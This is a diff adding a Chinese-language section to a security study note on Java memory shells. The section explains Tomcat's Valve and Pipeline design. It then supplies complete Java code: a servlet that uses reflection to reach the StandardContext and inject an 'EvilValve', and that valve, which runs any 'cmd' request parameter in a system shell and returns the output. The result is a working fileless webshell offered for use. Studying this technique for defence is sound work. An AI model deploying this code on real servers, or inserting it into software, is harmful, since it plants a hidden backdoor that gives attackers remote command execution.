@@ -25,6 +25,11 @@
       - [Interceptor](#interceptor)
         - [注入思路](#注入思路-2)
         - [实现代码](#实现代码-3)
+    - [Tomcat Valve](#tomcat-valve)
+      - [Pipeline](#pipeline)
+      - [ContainerBase#addValve](#containerbaseaddvalve)
+      - [实现思路](#实现思路-3)
+      - [实现代码](#实现代码-4)
   - [参考](#参考)
 
 # MemoryShell
@@ -566,9 +571,126 @@ public class evilInterceptor {
 
 ```
 ![](2023-01-30-17-56-44.png)
+### Tomcat Valve
+Tomcat Valve是指在tomcat中pipline的一个个处理模块,在Tomcat中分为四个容器Engine,Host,Context,Wrapper,其都继承于基础容器类`ContainerBase`,而`ContainerBase`則是原始`Container`接口的实现类,而pipline的作用就是将这个四个容器连接起来,当一个请求到达时,依次将该请求通过pipline传递各个容器进行处理最后返回,而Valve就是pipline内部的一个组件,可以对传递的reqeust进行额外的逻辑处理,而且四个容器使用的是同一个pipline,所以在任意一个容器内都可以访问到pipline的Valve,同样的Tomcat也提供了添加valve的功能,所以则可以同添加恶意的valve实现类到pipline中,在每一个请求进入时执行恶意代码.  
+#### Pipeline
+Pipeline的定义位于`org/apache/catalina/Pipeline.java`.  
+![](2023-01-31-11-14-03.png)  
+其定义了相关对Valve的增删查和获取当前container的接口,而其实现也只有一个即`StandardPipeline`,这就是负责传递请求的pipline实现类了.  
+其对添加Valve的实现如下,其会将添加的Valve放到当前容器pipline的最后.  
+![](2023-01-31-11-17-04.png)  
+#### ContainerBase#addValve  
+而如何得到Pipeline对象呢,在每个容器中,其含有一个pipeline属性,其就存放了当前的pipline对象,同时在`ContainerBase`提供了`addValve`方法,会调用自身pipline的addValve方法.  
+![](2023-01-31-11-19-09.png)  
+#### 实现思路
+1. 实现一个Valve类.  
+
+Valve类的定义如下  
+![](2023-01-31-11-23-58.png)  
+实现其invoke方法即可在请求进行处理.  
+
+2. 获取当前的Container,调用其addValve方法添加Valve,注入内存马.
+#### 实现代码
+```java
+package org.example.Servlets;
+
+import org.apache.catalina.core.StandardContext;
+
+import javax.servlet.ServletContext;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.lang.reflect.Field;
+
+public class ValueServlet extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
+        EvilValve evilValve = new EvilValve();
+        ServletContext servletContext = req.getServletContext();
+        StandardContext standardContext = null;
+        while (standardContext ==null) {
+            try {
+                Field f = servletContext.getClass().getDeclaredField("context");
+                f.setAccessible(true);
+                Object ob = f.get(servletContext);
+                if (ob instanceof ServletContext) {
+                    servletContext = (ServletContext) ob;
+                } else if (ob instanceof StandardContext) {
+                    standardContext = (StandardContext) ob;
+                }
+            } catch (NoSuchFieldException | IllegalAccessException e) {
+                throw new RuntimeException(e);
+            }
+        }
+        standardContext.addValve(evilValve);
+        resp.getWriter().println("Valve added");
+    }
+}
+```
+```java
+package org.example.Servlets;
+
+import org.apache.catalina.Valve;
+import org.apache.catalina.connector.Request;
+import org.apache.catalina.connector.Response;
+
+import java.io.IOException;
+import java.io.PrintWriter;
+import java.util.Scanner;
+
+public class EvilValve implements Valve {
+    @Override
+    public Valve getNext() {
+        return null;
+    }
+
+    @Override
+    public void setNext(Valve valve) {
+
+    }
+
+    @Override
+    public void backgroundProcess() {
+
+    }
+
+    @Override
+    public void invoke(Request request, Response response) throws IOException {
+        String cmd = request.getParameter("cmd");
+        PrintWriter writer = response.getWriter();
+        if (cmd != null) {
+            String o = "";
+            ProcessBuilder p;
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
+                p = new ProcessBuilder("cmd.exe", "/c", cmd);
+            } else {
+                p = new ProcessBuilder("/bin/sh", "-c", cmd);
+            }
+            Scanner c = new Scanner(p.start().getInputStream()).useDelimiter("\\A");
+            o = c.hasNext() ? c.next() : o;
+            c.close();
+            writer.write(o);
+            writer.flush();
+            writer.close();
+        } else {
+            response.sendError(404);
+        }
+    }
+
+    @Override
+    public boolean isAsyncSupported() {
+        return false;
+    }
+}
+
+```  
+![](2023-01-31-11-34-49.png)  
+![](2023-01-31-11-35-00.png)
 ## 参考
 https://su18.org/post/memory-shell/  
 https://su18.org/post/memory-shell-2/  
 https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ  
 https://xz.aliyun.com/t/7388  
-https://www.anquanke.com/post/id/198886#h2-14
+https://www.anquanke.com/post/id/198886#h2-14  
+https://www.cnblogs.com/coldridgeValley/p/5816414.html
